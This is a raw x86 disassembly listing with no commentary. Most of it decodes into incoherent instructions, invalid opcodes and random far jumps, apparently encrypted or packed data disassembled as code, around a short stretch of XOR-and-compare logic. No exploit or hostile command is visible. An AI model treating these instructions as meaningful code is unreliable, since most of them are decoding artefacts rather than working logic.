  4145d4:	pop    ecx
  4145d5:	popf   
  4145d6:	pop    edi
  4145d7:	cdq    
  4145d8:	clc    
  4145d9:	cs mov ecx,ecx
  4145dc:	jnp    0x4145da
  4145de:	xchg   ebp,eax
  4145df:	retf   0xedca
  4145e2:	aas    
  4145e3:	(bad)  
  4145e4:	in     eax,dx
  4145e5:	hlt    
  4145e6:	xchg   edx,eax
  4145e7:	test   ah,dl
  4145e9:	push   ds
  4145ea:	sub    ah,ah
  4145ec:	add    al,0x1f
  4145ee:	push   ds
  4145ef:	cmp    al,ah
  4145f1:	sti    
  4145f2:	mov    ebx,0x92bb85de
  4145f7:	jp     0x4145b5
  4145f9:	cmp    eax,0xac24f833
  4145fe:	dec    edi
  4145ff:	add    DWORD PTR [edx+0x7746c96d],edx
  414605:	outs   dx,BYTE PTR ds:[esi]
  414606:	mov    dl,0x1b
  414608:	jb     0x41465a
  41460a:	pop    edx
  41460b:	sub    BYTE PTR [edi+0x79],dl
  41460e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414610:	dec    ecx
  414611:	lock movntq QWORD PTR [esp+eax*2],mm0
  414616:	aas    
  414617:	sub    dl,BYTE PTR [ecx-0x425fc58d]
  41461d:	mov    edx,ss
  41461f:	pop    ds
  414620:	jne    0x4145fb
  414622:	mov    bh,0xe7
  414624:	sbb    DWORD PTR [ebx+0x38],ebp
  414627:	pop    ss
  414628:	dec    eax
  414629:	mov    al,ds:0x76c1a72d
  41462e:	xor    esp,DWORD PTR [esi-0x27294ec0]
  414634:	jmp    0x990a77c5
  414639:	loope  0x414602
  41463b:	sti    
  41463c:	loop   0x414656
  41463e:	mov    ebp,0x3d11b889
  414643:	push   0x78
  414645:	xor    ebx,DWORD PTR [ebx+0x45bf3ece]
  41464b:	inc    ebx
  41464c:	js     0x414607
  41464e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464f:	add    dl,BYTE PTR [edx+0x6ad9c578]
  414655:	push   es
  414656:	mov    DWORD PTR [ebx+0x30ee21d7],ebx
  41465c:	xchg   DWORD PTR [ebx],esi
  41465e:	adc    al,dl
  414660:	fwait
  414661:	or     al,BYTE PTR [eax-0x31]
  414664:	mov    DWORD PTR [ecx],esi
  414666:	xchg   DWORD PTR [edi+0x5adb78d9],esi
  41466c:	sbb    eax,0xb5606b5b
  414671:	cmp    DWORD PTR [edi-0x16],edx
  414674:	test   edx,0x27e390e2
  41467a:	jne    0x4146db
  41467c:	out    0x5,al
  41467e:	nop
  41467f:	ss sub eax,0x1f62df07
  414685:	pop    esp
  414686:	mov    ds:0xbb6e23a7,eax
  41468b:	pop    esp
  41468c:	cdq    
  41468d:	cmp    DWORD PTR [esi+eax*1+0x2f7f4554],0x45a49311
  414698:	sti    
  414699:	sbb    DWORD PTR [edx],ecx
  41469b:	cmp    DWORD PTR [edi],0xffffffa9
  41469e:	pop    ss
  41469f:	add    ch,bl
  4146a1:	jge    0x414693
  4146a3:	adc    edx,esp
  4146a5:	xchg   DWORD PTR [edx-0x45e85e98],esi
  4146ab:	bound  ebx,QWORD PTR [esi-0x47d96298]
  4146b1:	mov    ah,0xc0
  4146b3:	fdiv   QWORD PTR [ebp+0x6c423d23]
  4146b9:	xor    BYTE PTR [ebx-0x48],dh
  4146bc:	ins    BYTE PTR es:[edi],dx
  4146bd:	stc    
  4146be:	shl    cl,1
  4146c0:	stc    
  4146c1:	add    al,0xec
  4146c3:	xor    edx,DWORD PTR [edi+0x5]
  4146c6:	and    DWORD PTR [eax+0x4a],edi
  4146c9:	inc    ebx
  4146ca:	(bad)  
  4146cb:	cmp    eax,DWORD PTR [ebp+0x6e]
  4146ce:	push   ebp
  4146cf:	cmp    al,0x36
  4146d1:	(bad)  
  4146d2:	aas    
  4146d3:	pop    ds
  4146d4:	inc    ebp
  4146d5:	jmp    0x41472a
  4146d7:	mov    DWORD PTR [eax+0x5a966049],ebp
  4146dd:	push   esp
  4146de:	pop    ds
  4146df:	jmp    0xfd50c2b8
  4146e4:	sahf   
  4146e5:	es xor ecx,edi
  4146e8:	cld    
  4146e9:	jle    0x41470f
  4146eb:	arpl   WORD PTR [ebx-0x3b],bx
  4146ee:	jl     0x41469a
  4146f0:	pusha  
  4146f1:	push   edi
  4146f2:	loope  0x414757
  4146f4:	xchg   DWORD PTR [edi-0x75169719],eax
  4146fa:	inc    edi
  4146fb:	inc    esp
  4146fc:	push   es
  4146fd:	xor    edi,DWORD PTR [ebx+ebx*2+0x756448f4]
  414704:	and    DWORD PTR [edi+0x60dbdb94],0xffffff8d
  41470b:	inc    ebx
  41470c:	mov    ebp,ecx
  41470e:	jg     0x4146f2
  414710:	pop    ecx
  414711:	pop    esp
  414712:	cwde   
  414713:	mov    dh,0x58
  414715:	or     eax,0x5d16fe09
  41471a:	sub    eax,0x785a7f91
  41471f:	sub    DWORD PTR [eax-0x1cca8536],esi
  414725:	xor    DWORD PTR [eax+0x5c5def03],0x54
  41472c:	mov    esp,eax
  41472e:	shl    DWORD PTR [ecx-0x1c],0xa2
  414732:	jne    0x414761
  414734:	cmp    esi,DWORD PTR ds:0x4035f30b
  41473a:	mov    al,ds:0xb3abf0d4
  41473f:	jbe    0x414710
  414741:	push   ebx
  414742:	xlat   BYTE PTR ds:[ebx]
  414743:	pop    esp
  414744:	mov    esp,0x5b5b8a7b
  414749:	sub    bh,BYTE PTR [ecx]
  41474b:	pop    ebx
  41474c:	mov    eax,ds:0xbe065f5c
  414751:	or     BYTE PTR [ecx+esi*8-0x2],bh
  414755:	add    al,0x83
  414757:	add    al,0x5e
  414759:	inc    esi
  41475a:	jae    0x414760
  41475c:	and    DWORD PTR [edx+0x38f7dd4b],esp
  414762:	jae    0x4146e5
  414764:	pushf  
  414765:	dec    esi
  414766:	and    BYTE PTR [edx-0x4],dl
  414769:	sbb    DWORD PTR [ecx-0x11a9411c],ebx
  41476f:	cmp    ebp,esi
  414771:	es ret 0xe497
  414775:	ret    
  414776:	mov    ds:0x14fbbe9b,eax
  41477b:	add    al,0xda
  41477d:	fidiv  DWORD PTR [edx+edi*4]
  414780:	loop   0x414712
  414782:	cmp    al,0x4c
  414784:	xchg   ecx,ebx
  414786:	sub    al,0x1e
  414788:	inc    ebp
  414789:	out    0xab,eax
  41478b:	adc    DWORD PTR [eax+0x7c],eax
  41478e:	cdq    
  41478f:	mov    dl,BYTE PTR [edx-0x417348f2]
  414795:	push   ebp
  414796:	adc    ch,ah
  414798:	outs   dx,DWORD PTR ds:[esi]
  414799:	xlat   BYTE PTR ds:[ebx]
  41479a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41479b:	imul   BYTE PTR ds:0x8b6f357c
  4147a1:	loope  0x4147bf
  4147a3:	mov    ebx,0x799f9d55
  4147a8:	leave  
  4147a9:	aas    
  4147aa:	sbb    edi,DWORD PTR [ecx]
  4147ac:	cmp    al,BYTE PTR [eax]
  4147ae:	xchg   BYTE PTR [ecx+0x16],ah
  4147b1:	ja     0x414830
  4147b3:	jb     0x414831
  4147b5:	cdq    
  4147b6:	inc    edi
  4147b7:	cdq    
  4147b8:	adc    dl,BYTE PTR [edx+0x4043986d]
  4147be:	inc    ebp
  4147bf:	test   eax,0x2a4d579a
  4147c4:	std    
  4147c5:	shl    edx,0x4c
  4147c8:	fmul   DWORD PTR [esi-0x13e0b3d]
  4147ce:	push   eax
  4147cf:	popa   
  4147d0:	mov    DWORD PTR [ecx-0x899428b],edi
  4147d6:	ret    0xac45
  4147d9:	inc    esi
  4147da:	ret    0x2802
  4147dd:	retf   0xd61f
  4147e0:	stc    
  4147e1:	push   ds
  4147e2:	(bad)  
  4147e4:	pop    ebp
  4147e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147e6:	dec    ecx
  4147e7:	lock popf 
  4147e9:	xor    ebx,eax
  4147eb:	ds mov bl,0xea
  4147ee:	push   esp
  4147ef:	aam    0x56
  4147f1:	aam    0xfe
  4147f3:	adc    eax,0xee739146
  4147f8:	mov    bl,0x35
  4147fa:	xchg   edi,eax
  4147fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147fc:	mov    edx,0xa023c02a
  414801:	cs stos BYTE PTR es:[edi],al
  414803:	enter  0x39cd,0x64
  414807:	shl    DWORD PTR [ecx],1
  414809:	cmp    ecx,DWORD PTR [ecx+0x70]
  41480c:	xchg   ebx,eax
  41480d:	and    eax,0x3ab3c12f
  414812:	xchg   edi,edx
  414814:	xor    eax,edi
  414816:	test   BYTE PTR [edi+0x2f189197],bh
  41481c:	xlat   BYTE PTR ds:[ebx]
  41481d:	arpl   WORD PTR [ecx+0x34c08e51],bp
  414823:	sbb    edx,ebx
  414825:	xor    ch,BYTE PTR [ecx+0x45f51957]
  41482b:	xlat   BYTE PTR ds:[ebx]
  41482c:	or     al,0xd3
  41482e:	jle    0x414865
  414830:	sbb    BYTE PTR [eax],ch
  414832:	jmp    0x98d8:0x58a29f93
  414839:	loope  0x41489f
  41483b:	lods   al,BYTE PTR ds:[esi]
  41483c:	imul   edx,DWORD PTR ds:0xe88c9f7,0x9acec796
  414846:	mov    edx,0x4e3fcb37
  41484b:	je     0x4147f7
  41484d:	push   edx
  41484e:	lods   eax,DWORD PTR ds:[esi]
  41484f:	and    ebp,esi
  414851:	add    BYTE PTR [ecx+0x253f76fc],al
  414857:	push   esi
  414858:	outs   dx,DWORD PTR ds:[esi]
  414859:	in     eax,dx
  41485a:	add    ah,BYTE PTR ds:0xbc8a5d4a
  414860:	fcomip st,st(6)
  414862:	xchg   edi,eax
  414863:	outs   dx,DWORD PTR ds:[esi]
  414864:	stos   BYTE PTR es:[edi],al
  414865:	add    eax,0x31ec8395
  41486a:	adc    DWORD PTR [eax-0x19],0xffffff88
  41486e:	imul   edi,ebp,0xffffffa6
  414871:	mov    al,0x1c
  414873:	je     0x4148ba
  414875:	mov    BYTE PTR [edi],bh
  414877:	and    al,0xea
  414879:	inc    ebx
  41487a:	inc    ebp
  41487b:	mov    edx,0x46521efd
  414880:	mov    cl,0x1d
  414882:	jo     0x41480f
  414884:	and    dh,BYTE PTR [ebx+0x17f2589]
  41488a:	or     BYTE PTR [esi-0xda885ee],bh
  414890:	pushf  
  414891:	lods   eax,DWORD PTR ds:[esi]
  414892:	push   ss
  414893:	jmp    0x25f4961a
  414898:	test   DWORD PTR [ecx],esi
  41489a:	adc    ebp,DWORD PTR [ebp+0x17]
  41489d:	mov    ecx,0x64805e56
  4148a2:	dec    edi
  4148a3:	or     BYTE PTR [ebp+eiz*2+0x2d02c905],dh
  4148aa:	imul   esi,DWORD PTR [ecx],0xa
  4148ad:	leave  
  4148ae:	jp     0x414926
  4148b0:	mov    ebx,0xfdae5038
  4148b5:	outs   dx,BYTE PTR ds:[esi]
  4148b6:	cmc    
  4148b7:	mov    ebp,0x305eb13a
  4148bc:	loopne 0x4148ee
  4148be:	jp     0x414852
  4148c0:	or     dh,al
  4148c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c3:	pop    esp
  4148c4:	or     dh,BYTE PTR [esi-0x4]
  4148c7:	fisubr DWORD PTR ds:0x354cda98
  4148cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ce:	stos   DWORD PTR es:[edi],eax
  4148cf:	mov    ds:0x73374baa,eax
  4148d4:	int    0xe0
  4148d6:	fdiv   QWORD PTR [eax]
  4148d8:	imul   ecx,edi,0xffffff97
  4148db:	mov    edi,0x4224056c
  4148e0:	inc    edi
  4148e1:	ror    BYTE PTR [ebx+0x61],cl
  4148e4:	daa    
  4148e5:	adc    eax,0x5048444c
  4148ea:	push   ds
  4148eb:	mov    bl,0xad
  4148ed:	lock arpl di,bx
  4148f0:	jecxz  0x4148e4
  4148f2:	ret    
  4148f3:	ja     0x4148d9
  4148f5:	mov    bl,0xb8
  4148f7:	and    al,0xf1
  4148f9:	fwait
  4148fa:	repnz cwde 
  4148fc:	clc    
  4148fd:	lea    ecx,es:[ebp-0x7b]
  414901:	mov    edx,0xd15b1b63
  414906:	cmp    BYTE PTR [edi+edi*2-0x54],dl
  41490a:	inc    ecx
  41490b:	test   al,0xdc
  41490d:	(bad)  
  41490e:	push   eax
  41490f:	jbe    0x41489c
  414911:	push   ebp
  414912:	hlt    
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    dh,cl
  414990:	sbb    eax,0x944e1736
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	jo     0x4149f4
  41499d:	dec    edx
  41499e:	std    
  41499f:	(bad)  
  4149a0:	lock shl BYTE PTR [eax-0x4079a9ef],cl
  4149a7:	xor    BYTE PTR [esi],ch
  4149a9:	xchg   edx,eax
  4149aa:	dec    eax
  4149ab:	sbb    dh,al
  4149ad:	out    dx,eax
  4149ae:	(bad)  
  4149af:	stc    
  4149b0:	aas    
  4149b1:	push   ds
  4149b2:	mov    esp,esi
  4149b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149b5:	fs fwait
  4149b7:	mov    ch,0x5a
  4149b9:	push   es
  4149ba:	shl    BYTE PTR [ecx],cl
  4149bc:	test   ax,0xd77b
  4149c0:	inc    esp
  4149c1:	and    bl,0x3c
  4149c4:	and    ecx,esi
  4149c6:	cmc    
  4149c7:	clc    
  4149c8:	daa    
  4149c9:	push   esi
  4149ca:	jmp    0x387467
  4149cf:	mov    bh,0x85
  4149d1:	cmp    DWORD PTR [ecx],eax
  4149d3:	repnz adc eax,0x80ec3e26
  4149d9:	push   edx
  4149da:	aaa    
  4149db:	sbb    eax,0xee60e044
  4149e0:	mov    edx,0xe528680a
  4149e5:	or     al,0x89
  4149e7:	fisub  DWORD PTR [ebx+0x593905fc]
  4149ed:	or     al,0x71
  4149ef:	xchg   esi,eax
  4149f0:	dec    ebx
  4149f1:	out    dx,al
  4149f2:	cmp    DWORD PTR [ebp+0x13b393a5],eax
  4149f8:	shr    DWORD PTR [ebx+eax*2-0x61],cl
  4149fc:	repz loopne 0x414a6b
  4149ff:	xor    eax,0x8e444b05
  414a04:	retf   0xe872
  414a07:	outs   dx,DWORD PTR ds:[esi]
  414a08:	or     al,0x27
  414a0a:	mov    WORD PTR [edx-0x5c5474a0],?
  414a10:	sbb    eax,0x81d2da46
  414a15:	push   esp
  414a16:	sub    eax,0xfa2a40b5
  414a1b:	out    0x65,eax
  414a1d:	xor    esi,ebp
  414a1f:	sahf   
  414a20:	leave  
  414a21:	aaa    
  414a22:	xchg   BYTE PTR [eax-0x7],ah
  414a25:	(bad)  
  414a26:	fucom  st(5)
  414a28:	mov    ecx,0xd2624735
  414a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a2e:	int3   
  414a2f:	xchg   ecx,ecx
  414a31:	push   edi
  414a32:	adc    esp,edx
  414a34:	(bad)  
  414a36:	ror    BYTE PTR [eax],1
  414a38:	xor    al,0xb6
  414a3a:	fld    DWORD PTR ds:0x71f90768
  414a40:	mov    fs,WORD PTR [esp+edi*2-0x29]
  414a44:	mov    al,ds:0xdd09781d
  414a49:	jmp    0x4870:0x8400698e
  414a50:	pop    edx
  414a51:	mov    ss,esp
  414a53:	jo     0x414a88
  414a55:	mul    BYTE PTR [edi+0x67f2d4fe]
  414a5b:	or     bh,BYTE PTR [esi+0x73]
  414a5e:	jmp    0xdaf0:0x3bf9374b
  414a65:	xchg   ebx,eax
  414a66:	loopne 0x414ab7
  414a68:	mov    ebx,0x4e0acbec
  414a6d:	dec    ebp
  414a6e:	ret    0x7170
  414a71:	mov    ebp,0x1007bafd
  414a76:	je     0x414a4d
  414a78:	(bad)  
  414a79:	mov    al,ds:0xf860e9e8
  414a7e:	ds jnp 0x414a0d
  414a81:	hlt    
  414a82:	mov    esi,0x48099e67
  414a87:	aam    0xac
  414a89:	and    BYTE PTR [esi-0x38abb4d8],ch
  414a8f:	mov    BYTE PTR [ebx-0x2e],cl
  414a92:	and    eax,0x660c9c67
  414a97:	xchg   ebp,eax
  414a98:	adc    edi,DWORD PTR [ebx]
  414a9a:	fwait
  414a9b:	jbe    0x414a40
  414a9d:	out    0xb8,al
  414a9f:	jae    0x414aeb
  414aa1:	xor    esi,eax
  414aa3:	sahf   
  414aa4:	xor    bl,BYTE PTR [edi-0x66929cdd]
  414aaa:	jnp    0x414a8a
  414aac:	les    ecx,FWORD PTR es:[esi+0x2b]
  414ab0:	push   ebp
  414ab1:	xor    eax,0xfdfd1214
  414ab6:	add    cl,dh
  414ab8:	test   BYTE PTR [eax-0x65ee52b7],0x91
  414abf:	dec    ah
  414ac1:	pop    es
  414ac2:	jno    0x414b28
  414ac4:	mov    WORD PTR es:[esp+esi*4-0x137337f2],?
  414acc:	shl    DWORD PTR [esi],cl
  414ace:	inc    eax
  414acf:	xchg   esp,eax
  414ad0:	mov    al,0xdb
  414ad2:	mov    DWORD PTR [eax],esi
  414ad4:	clc    
  414ad5:	mov    dl,0x1d
  414ad7:	fdivr  QWORD PTR [edi]
  414ad9:	rcl    BYTE PTR [ebx],1
  414adb:	inc    eax
  414adc:	sub    DWORD PTR [ecx+0x18ab278a],eax
  414ae2:	sbb    DWORD PTR [edi+0xe],edi
  414ae5:	sar    DWORD PTR [ecx+0x3b114c89],1
  414aeb:	inc    eax
  414aec:	sar    DWORD PTR [ebp+0x14],cl
  414aef:	jno    0x414b13
  414af1:	sbb    ebp,DWORD PTR [edx+edx*1-0x4f7d7503]
  414af8:	into   
  414af9:	out    0xe9,al
  414afb:	daa    
  414afc:	jo     0x414b26
  414afe:	mov    esi,0x7d3a8c2b
  414b03:	into   
  414b04:	or     DWORD PTR [ecx],ebx
  414b06:	pop    ebx
  414b07:	aaa    
  414b08:	mov    es,WORD PTR [ebx]
  414b0a:	lock pop edx
  414b0c:	scas   eax,DWORD PTR es:[edi]
  414b0d:	jo     0x414b3a
  414b0f:	sti    
  414b10:	test   DWORD PTR [ebx-0x48],0x3cfeec6c
  414b17:	or     DWORD PTR [ebp+ebx*4+0x35976b6d],esi
  414b1e:	in     al,dx
  414b1f:	adc    al,0xe2
  414b21:	or     eax,0x1a07687
  414b26:	ja     0x414afa
  414b28:	call   0xf81d:0xd92a9f9e
  414b2f:	mov    esi,0x61140f5e
  414b34:	mov    bh,0xd6
  414b36:	jno    0x414b0a
  414b38:	div    DWORD PTR [esi]
  414b3a:	adc    DWORD PTR [ebp+0x65],edi
  414b3d:	adc    al,0xce
  414b3f:	rcr    BYTE PTR [ebp-0x3b2e3777],0xb0
  414b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b47:	dec    ecx
  414b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b49:	or     eax,eax
  414b4b:	sbb    eax,0x45fba109
  414b50:	loope  0x414adb
  414b52:	add    ecx,ecx
  414b54:	dec    ecx
  414b55:	or     al,0x4c
  414b57:	adc    eax,0x99d4b937
  414b5c:	pop    esi
  414b5d:	pop    ss
  414b5e:	hlt    
  414b5f:	js     0x414b96
  414b61:	dec    edi
  414b62:	or     ah,BYTE PTR [ecx-0x3e]
  414b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b66:	adc    BYTE PTR [ebx+eax*2-0x46bf0085],0xf0
  414b6e:	pop    ebx
  414b6f:	std    
  414b70:	call   0x1d26:0x6d35b734
  414b77:	(bad)  
  414b78:	inc    ecx
  414b79:	jmp    0xaf1ec06c
  414b7e:	retf   0x4a03
  414b81:	imul   BYTE PTR [ebx]
  414b83:	push   ss
  414b84:	sub    al,0x2c
  414b86:	pop    edi
  414b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b88:	mov    esp,0x303ab944
  414b8d:	inc    BYTE PTR [esi-0x5cf2fcd4]
  414b93:	(bad)  
  414b94:	jno    0x414b46
  414b96:	ja     0x414b76
  414b98:	pop    edx
  414b99:	sub    ch,BYTE PTR [esi]
  414b9b:	jo     0x414b52
  414b9d:	mov    esp,0x8e5b9291
  414ba2:	xchg   esp,eax
  414ba3:	jae    0x414b4d
  414ba5:	dec    edi
  414ba6:	or     eax,0xc732ae51
  414bab:	pushf  
  414bac:	xor    DWORD PTR [ebx+0x44],eax
  414baf:	mov    ds:0xaafc46ac,al
  414bb4:	out    0xe9,eax
  414bb6:	push   es
  414bb7:	ins    DWORD PTR es:[edi],dx
  414bb8:	out    dx,al
  414bb9:	retf   0x100
  414bbc:	ss arpl ax,bp
  414bbf:	fisttp DWORD PTR [bp+di-0x479f]
  414bc4:	call   0x852b:0x471a6f21
  414bcb:	jns    0x414c2f
  414bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bce:	stos   BYTE PTR es:[edi],al
  414bcf:	(bad)  [ebp-0x55fa9b07]
  414bd5:	cdq    
  414bd6:	push   cs
  414bd7:	(bad)  
  414bd8:	popa   
  414bd9:	cli    
  414bda:	stos   DWORD PTR es:[edi],eax
  414bdb:	lods   al,BYTE PTR ds:[esi]
  414bdc:	iret   
  414bdd:	out    0x93,al
  414bdf:	das    
  414be0:	rcl    DWORD PTR [eax],1
  414be2:	(bad)  
  414be3:	push   ebx
  414be4:	jge    0x414bf6
  414be6:	test   DWORD PTR [ebx-0x3a0cce57],ecx
  414bec:	jb     0x414bdc
  414bee:	mov    edi,0x4ff5d0d8
  414bf3:	stos   BYTE PTR es:[edi],al
  414bf4:	pop    ss
  414bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bf6:	repnz sbb bl,dl
  414bf9:	(bad)
  414bfd:	cs cmp eax,eax
  414c00:	dec    ecx
  414c01:	ds pop ds
  414c03:	adc    BYTE PTR [ebp-0x3d],bh
  414c06:	mov    al,0xcf
  414c08:	jle    0x414b8c
  414c0a:	jbe    0x414c08
  414c0c:	push   ebp
  414c0d:	add    eax,0xb355075a
  414c13:	dec    ecx
  414c14:	pop    ebx
  414c15:	lock push cs
  414c17:	call   FWORD PTR [edx+0x5f4224d7]
  414c1d:	rcr    BYTE PTR [ecx+edi*2-0x4f],cl
  414c21:	pop    edi
  414c22:	in     eax,dx
  414c23:	mov    DWORD PTR [esi],edx
  414c25:	es cdq 
  414c27:	push   esi
  414c28:	je     0x414c0f
  414c2a:	scas   eax,DWORD PTR es:[edi]
  414c2b:	lods   eax,DWORD PTR ds:[esi]
  414c2c:	adc    eax,0x53316059
  414c31:	ds enter 0x6014,0x63
  414c36:	cmp    cl,cl
  414c38:	mov    eax,0xc86fd9a2
  414c3d:	or     eax,0xcf07a0e8
  414c42:	shl    BYTE PTR ds:0x23c70950,cl
  414c48:	outs   dx,BYTE PTR ds:[esi]
  414c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c4a:	push   esp
  414c4b:	xor    BYTE PTR [esi+0x7ed4de49],dl
  414c51:	fmulp  st(3),st
  414c53:	adc    ecx,DWORD PTR [ebx]
  414c55:	sub    BYTE PTR ds:0x92fddae3,cl
  414c5b:	push   0xddfb6cb1
  414c60:	mul    BYTE PTR [eax]
  414c62:	or     DWORD PTR [ebx],0xffffff85
  414c65:	pushf  
  414c66:	sti    
  414c67:	out    0x81,al
  414c69:	sub    al,0x7c
  414c6b:	ret    
  414c6c:	sub    dh,BYTE PTR [ecx]
  414c6e:	loop   0x414c4f
  414c70:	jmp    0xf823:0xee720a7
  414c77:	xchg   edi,eax
  414c78:	fldcw  WORD PTR [edx]
  414c7a:	call   0x843eca4b
  414c7f:	pusha  
  414c80:	cwde   
  414c81:	adc    al,0x79
  414c83:	sti    
  414c84:	lds    ebp,FWORD PTR [ecx]
  414c86:	mov    dl,0x3
  414c88:	mov    ah,0x71
  414c8a:	and    eax,0xdddf988c
  414c8f:	push   ebp
  414c90:	in     eax,dx
  414c91:	xchg   DWORD PTR [ebp*8-0x1a87ab75],esp
  414c98:	push   0xf24f5ec5
  414c9d:	add    ebx,DWORD PTR ds:0x54b7ff8e
  414ca3:	push   es
  414ca4:	push   edx
  414ca5:	shl    DWORD PTR [ecx],0x4d
  414ca8:	add    eax,0xadafb265
  414cad:	mov    ds:0xaabb7d90,al
  414cb2:	inc    ebx
  414cb3:	ins    BYTE PTR es:[edi],dx
  414cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cb5:	inc    edx
  414cb6:	sar    BYTE PTR [edi-0x30],0x8f
  414cba:	in     al,dx
  414cbb:	sub    BYTE PTR [esi-0x5da75bcc],bl
  414cc1:	lds    edx,FWORD PTR [edx]
  414cc3:	into   
  414cc4:	das    
  414cc5:	fadd   QWORD PTR [ecx]
  414cc7:	and    DWORD PTR [edi+edx*2],0xed6e30b
  414cce:	fisub  WORD PTR [bp+di-0x25a9]
  414cd3:	ja     0x414c73
  414cd5:	stc    
  414cd6:	xor    eax,0x79bf4b19
  414cdb:	add    eax,edx
  414cdd:	shl    ecx,cl
  414cdf:	mul    bh
  414ce1:	pop    edi
  414ce2:	jle    0x414d34
  414ce4:	pop    es
  414ce5:	cmpxchg DWORD PTR [ebx+0x2f],ebx
  414ce9:	fcmovbe st,st(5)
  414ceb:	in     eax,0x5f
  414ced:	add    bl,bh
  414cef:	test   eax,0xe5743c72
  414cf4:	push   0xffffffca
  414cf6:	lahf   
  414cf7:	push   ebx
  414cf8:	push   0xffffffb2
  414cfa:	adc    al,BYTE PTR [esi+0x26]
  414cfd:	xchg   edx,eax
  414cfe:	dec    ebx
  414cff:	inc    ebx
  414d00:	sub    eax,eax
  414d02:	sti    
  414d03:	jbe    0x414cff
  414d05:	test   eax,0x4823e3ea
  414d0a:	pop    ds
  414d0b:	jle    0x414cbf
  414d0d:	(bad)  
  414d0e:	(bad)  
  414d0f:	xchg   ecx,eax
  414d10:	mov    esp,0x3f2708cc
  414d15:	mov    eax,ds:0x5c3be514
  414d1a:	into   
  414d1b:	jmp    0xc78a2051
  414d20:	push   ss
  414d21:	mov    edx,0xcccb8329
  414d26:	not    esi
  414d28:	cdq    
  414d29:	push   ebx
  414d2a:	rol    BYTE PTR [edx-0x2e2a9bff],cl
  414d30:	xor    ebx,0xffffff87
  414d33:	cdq    
  414d34:	inc    ebx
  414d35:	mov    ebp,0x1f67889e
  414d3a:	xor    eax,0x5ceb55b8
  414d3f:	cmp    eax,0x4235d75f
  414d44:	push   eax
  414d45:	inc    ebp
  414d46:	mov    edx,0x40d6936d
  414d4b:	(bad)  
  414d4c:	dec    eax
  414d4d:	popf   
  414d4e:	xor    DWORD PTR [esi+0x309b24e1],esp
  414d54:	lea    eax,[esi]
  414d56:	in     al,dx
  414d57:	into   
  414d58:	xor    eax,0x9550f732
  414d5d:	fnstcw WORD PTR [ecx+edx*4+0xb]
  414d61:	and    BYTE PTR [ebp-0x4ed92808],0xcc
  414d68:	mov    ebx,ebp
  414d6a:	push   ebx
  414d6b:	out    dx,al
  414d6c:	fcomp  QWORD PTR [ebx+0x55e631cd]
  414d72:	sbb    eax,0x5f51ee26
  414d77:	jne    0x414dd7
  414d79:	mov    dh,0x68
  414d7b:	sbb    al,0x20
  414d7d:	pop    ebp
  414d7e:	push   ebx
  414d7f:	cs ins DWORD PTR es:[edi],dx
  414d81:	ins    BYTE PTR es:[edi],dx
  414d82:	ins    DWORD PTR es:[edi],dx
  414d83:	jle    0x414d2a
  414d85:	out    0x20,al
  414d87:	stos   BYTE PTR es:[edi],al
  414d88:	ss in  al,dx
  414d8a:	test   al,0x2b
  414d8c:	daa    
  414d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8e:	(bad)  
  414d8f:	call   DWORD PTR [ebx+0x732ba950]
  414d95:	jp     0x414d71
  414d97:	add    al,0x28
  414d99:	mov    DWORD PTR [esi-0x38],edx
  414d9c:	into   
  414d9d:	or     bh,BYTE PTR [eax+0x746ed21a]
  414da3:	loopne 0x414dc2
  414da5:	stos   BYTE PTR es:[edi],al
  414da6:	mov    gs,WORD PTR [esi]
  414da8:	push   cs
  414da9:	lea    esp,[edx+0x61306e91]
  414daf:	inc    ebx
  414db0:	cmp    BYTE PTR [edx+0x7c0054cf],ah
  414db6:	pop    es
  414db7:	sub    ebp,ecx
  414db9:	test   al,0xf5
  414dbb:	jmp    0xec23:0x850c92f6
